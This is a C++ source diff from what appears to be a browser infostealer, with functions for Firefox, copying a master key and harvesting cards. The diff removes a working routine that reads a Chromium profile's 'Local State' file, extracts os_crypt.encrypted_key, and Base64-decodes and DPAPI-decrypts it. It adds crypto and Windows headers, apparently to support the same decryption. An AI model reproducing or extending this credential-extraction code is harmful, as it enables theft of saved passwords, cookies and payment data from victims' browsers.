@@ -28,9 +28,21 @@
 #include <fstream>
 #include <vector>
 #include "../../dependencies/sqlite/sqlite3.h"
-#include "../../dependencies/Base64.h"
-#include "../../dependencies/json.hpp"
-#include "../../dependencies/binaryhandler.hpp"
+
+
+
+
+
+#include <sodium.h>
+#include <windows.h>
+#include <wincrypt.h>
+#include <openssl/aes.h>
+#include <openssl/conf.h>
+#include <openssl/evp.h>
+#include <openssl/err.h>
+#include "DecryptionHandler.h"
+#include "json.hpp"
+
 
 
 namespace global 
@@ -137,27 +149,6 @@ void browsers::FireFox()
 
 }
 
-std::string master_k(std::string path) {
-    path += "/Local State";
-    std::string content;
-    try {
-        nk125::binary_file_handler b;
-        content = b.read_file(path);
-        auto v = nlohmann::json::parse(content);
-        content = v["os_crypt"]["encrypted_key"];
-    }
-    catch (...) { return ""; }
-
-#ifdef DEBUG_MOD
-    std::cout << "Encrypted Master key: " << content << "\n";
-#endif
-
-    std::string master;
-    macaron::Base64::Decode(content, master);
-    master = decrypt_c32(master.substr(5, master.size() - 5));
-
-    return master;
-}
 
 void CopyMasterKey(std::string path, int counter)
 {
@@ -246,3 +237,5 @@ void GetCards(std::string path, std::string profile, int counter)
 {
 
 }
+
+
